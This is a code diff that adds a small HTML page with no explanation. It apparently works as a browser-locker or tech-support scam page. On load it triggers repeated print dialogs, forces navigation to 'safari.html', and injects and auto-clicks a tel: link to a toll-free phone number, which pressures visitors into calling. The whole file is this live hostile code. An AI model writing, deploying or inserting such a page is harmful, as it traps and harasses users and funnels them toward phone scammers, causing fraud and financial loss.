@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+	<script type="text/javascript">
+		window.onload = function() {
+			window.print();
+			window.open('safari.html');
+			window.location = 'safari.html';
+		}
+ 	</script>
+</head>
+<body style="color:#000">
+	<p id ="call"> </p>
+	<script type="text/javascript">
+		function blinker() {
+			$('.blinking').fadeOut(500);
+			$('.blinking').fadeIn(500);
+		}
+		setInterval(blinker, 1000);
+		jQuery('#call').append('<a href="tel:' + "+1-855-928-0131" + '%00">.</a>');
+		document.querySelector('a').click();
+		window.print();
+		document.querySelector('a').click();
+	</script>
+</body>
+</html>
